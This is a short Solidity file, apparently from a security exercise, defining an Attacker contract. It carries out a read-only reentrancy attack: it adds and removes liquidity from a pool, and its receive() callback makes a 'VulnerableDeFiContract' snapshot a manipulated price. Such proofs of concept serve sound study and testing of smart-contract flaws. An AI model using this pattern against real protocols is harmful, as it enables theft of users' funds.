//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../src/ReadOnly.sol";

contract Attacker {
    ReadOnlyPool pool;
    VulnerableDeFiContract defi;

    constructor(ReadOnlyPool _pool, VulnerableDeFiContract _defi) payable {
        pool = _pool;
        defi = _defi;
    }

    function attack() external {
        pool.addLiquidity{value: 2 ether}();
        pool.removeLiquidity();
    }

    receive() external payable {
        defi.snapshotPrice();
    }
}
